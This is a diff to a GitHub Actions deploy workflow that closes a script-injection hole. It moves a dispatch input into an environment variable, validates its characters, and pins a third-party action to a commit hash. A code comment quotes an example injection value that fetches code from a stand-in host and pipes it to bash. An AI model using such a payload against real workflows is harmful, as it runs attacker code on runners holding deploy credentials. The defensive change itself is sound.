@@ -28,20 +28,27 @@ jobs:
     steps:
       - name: Resolve tag to immutable digest
         id: resolve
+        env:
+          # Pass the dispatch input through env, never interpolated into the run: body — an input
+          # like `"; curl evil | bash` would otherwise execute on the runner that holds the deploy
+          # key + tailnet session. Charset-validate before use.
+          IMAGE_TAG: ${{ github.event.inputs.image_tag }}
         run: |
           set -euo pipefail
           REPO="ghcr.io/${GITHUB_REPOSITORY,,}"   # ghcr repo paths are lowercase
-          TAG="${{ github.event.inputs.image_tag }}"
-          DIGEST="$(docker buildx imagetools inspect "${REPO}:${TAG}" --format '{{.Manifest.Digest}}')"
+          case "$IMAGE_TAG" in
+            ''|*[!A-Za-z0-9._-]*) echo "::error::invalid image_tag '$IMAGE_TAG'"; exit 1 ;;
+          esac
+          DIGEST="$(docker buildx imagetools inspect "${REPO}:${IMAGE_TAG}" --format '{{.Manifest.Digest}}')"
           case "$DIGEST" in
             sha256:*) ;;
-            *) echo "::error::could not resolve a digest for ${REPO}:${TAG} (got '${DIGEST}')"; exit 1 ;;
+            *) echo "::error::could not resolve a digest for ${REPO}:${IMAGE_TAG} (got '${DIGEST}')"; exit 1 ;;
           esac
           echo "image=${REPO}@${DIGEST}" >> "$GITHUB_OUTPUT"
-          echo "Resolved ${REPO}:${TAG} -> ${REPO}@${DIGEST}"
+          echo "Resolved ${REPO}:${IMAGE_TAG} -> ${REPO}@${DIGEST}"
 
       - name: Connect to tailnet (ephemeral, tag:ci-deploy)
-        uses: tailscale/github-action@v3
+        uses: tailscale/github-action@6cae46e2d796f265265cfcf628b72a32b4d7cade # v3
         with:
           oauth-client-id: ${{ secrets.TS_OAUTH_CLIENT_ID }}
           oauth-secret: ${{ secrets.TS_OAUTH_SECRET }}
